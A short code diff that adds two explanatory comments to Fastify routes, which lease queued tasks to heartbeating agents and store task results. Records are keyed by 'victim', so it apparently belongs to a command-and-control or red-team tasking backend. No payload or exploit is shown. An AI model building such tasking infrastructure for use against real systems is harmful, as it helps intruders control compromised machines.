@@ -154,6 +154,7 @@ export const agentRoutes: FastifyPluginAsync = async (app) => {
     if (!signed(victim)) throw bad('stale', 'heartbeat first', 409);
     const now = new Date();
     const rows = await prisma.task.findMany({
+      // `unknown`/`expired` are terminal and never re-leased.
       where: { victimId: victim.id, notBefore: { lte: now }, OR: [{ status: 'queued' }, { status: 'running', leaseUntil: { lt: now } }] },
       orderBy: [{ priority: 'desc' }, { createdAt: 'asc' }],
       take: limit
@@ -182,6 +183,7 @@ export const agentRoutes: FastifyPluginAsync = async (app) => {
     const input = resultSchema.parse(request.body);
     const outcome = await applyTaskResult(victim.id, id, input);
     if (outcome === 'missing') throw notFound('task');
+    // A duplicate final body is a typed conflict, not a 5xx or an error metric.
     if (outcome === 'conflict') return reply.code(409).send({ error: 'already_finished', message: 'result already stored' });
     return { ok: true };
   });
